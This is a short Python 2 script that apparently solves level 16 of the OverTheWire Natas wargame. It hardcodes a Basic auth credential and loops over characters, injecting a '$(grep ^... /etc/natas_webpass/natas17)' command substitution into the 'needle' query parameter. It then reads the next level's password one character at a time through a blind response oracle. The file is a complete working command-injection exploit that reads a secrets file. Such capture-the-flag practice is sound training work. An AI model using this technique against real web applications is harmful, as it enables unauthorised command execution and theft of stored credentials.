import requests
import string
import sys

chars = list(string.lowercase + string.uppercase + string.digits)

url = "http://natas16.natas.labs.overthewire.org/"
headers = {
  'authorization': "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="
}

password = ""

while True:
  for char in chars:
    response = requests.request("GET", url, headers=headers, params={"needle": "$(grep ^" + (password + char) +  " /etc/natas_webpass/natas17)aardvark"})
    if "aardvark" not in response.text:
      password += char
      sys.stdout.write("\rpassword: %s" % password)
      sys.stdout.flush()
      response = requests.request("GET", url, headers=headers, params={"needle": "$(grep ^" + password +  "$ /etc/natas_webpass/natas17)aardvark"})
      if "aardvark" not in response.text:
        print "\n"
        sys.exit()
      break